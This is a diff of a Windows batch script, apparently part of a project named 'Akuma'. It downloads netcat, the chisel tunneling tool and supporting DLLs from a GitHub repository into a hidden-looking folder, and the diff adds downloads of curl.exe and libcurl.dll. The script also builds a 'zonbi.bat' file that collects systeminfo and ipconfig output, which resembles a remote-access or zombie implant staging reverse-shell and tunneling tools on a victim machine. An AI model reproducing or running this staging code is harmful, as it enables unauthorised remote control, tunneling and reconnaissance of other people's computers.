@@ -8,6 +8,8 @@ mkdir %homedrive%\Akuma\nc
 curl -L https://github.com/l-urk/Akuma/raw/main/Utilities/nc.exe > %homedrive%\Akuma\nc\nc.exe
 curl -L https://github.com/l-urk/Akuma/raw/main/dll/libcrypto-3.dll > %homedrive%\Akuma\nc\libcrypto-3.dll
 curl -L https://github.com/l-urk/Akuma/raw/main/Utilities/chisel.exe > %homedrive%\Akuma\chisel.exe
+curl -L https://github.com/l-urk/Akuma/raw/main/Utilities/curl.exe > %homedrive%\Akuma\curl.exe
+curl -L https://github.com/l-urk/Akuma/raw/main/dll/libcurl.dll > %homedrive%\Akuma\libcurl.dll
 echo del %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
 echo systeminfo ^>^> %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
 echo ipconfig /all ^>^> %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
